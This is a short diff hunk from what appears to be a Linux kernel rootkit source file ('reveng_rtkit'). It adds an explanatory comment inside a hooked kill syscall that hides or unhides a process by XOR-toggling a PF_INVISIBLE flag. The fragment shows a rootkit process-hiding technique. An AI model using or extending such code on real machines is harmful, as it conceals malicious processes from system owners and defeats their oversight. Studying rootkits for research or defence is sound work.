@@ -1969,6 +1969,10 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
             return -ESRCH;
 	  // Hiding process using XOR operation
           task->flags = task->flags ^ PF_INVISIBLE;
+	  /*
+	   * 0 = 1 ^ 1
+	   * 1 = 1 ^ 0
+	   */
           printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
           break;
         default:
